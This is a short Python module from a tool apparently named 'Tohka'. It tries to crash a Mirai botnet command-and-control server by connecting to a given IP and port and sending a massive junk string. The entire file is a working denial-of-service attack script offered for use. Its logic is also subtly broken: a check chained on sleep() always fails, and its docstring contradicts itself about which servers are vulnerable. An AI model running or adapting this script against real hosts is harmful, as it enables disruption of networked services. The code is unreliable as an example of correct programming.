from socket import socket
from time   import sleep


from Tohka.lib.colors import Colors #type: ignore
        
def exploit(host: tuple, attack: bool = False) -> bool:
    """OOB Exploit function.

    Args:
        host(tuple): CNC host(ip, port)
        attack(bool): Whether to send payload or not.

    Returns:
        None
    
    """
    with socket() as sock:
        sock.settimeout(5.0)

        try:
            sock.connect(host)
        except:
            return False
        
        if attack:
            sock.send('lmaoWTF'.join('ManaKiller'*999999).encode())
        
        return True
        


class TohkaModule:
    def main(params: str) -> None:
        """Crash a mirai CNC server
        - Works for all CNC'S that have patched the vuln (OOB)

        Args:
            params(tuple) CNC IP address, CNC port

        Returns:
            None
        """

        ip, port = params.split()
        print(f'\n{Colors.YELLOW}• {Colors.WHITE}Attempting to kill CNC {Colors.WHITE}({Colors.PURPLE}{ip}{Colors.WHITE}:{Colors.PURPLE}{port}{Colors.WHITE})...')
        host: tuple = (ip, int(port))
        if exploit(host):
            print(f'  {Colors.LIME}• {Colors.WHITE}Host online.')

            if exploit(host, attack = True) and sleep(3) and not exploit(host):
                print(f'  {Colors.LIME}• {Colors.WHITE}Killed CNC.\n')
            else:
                print(f'  {Colors.RED}• {Colors.WHITE}Failed to kill CNC.\n')

        else:
            print(f'  {Colors.RED}• {Colors.WHITE}Host offline\n')


        



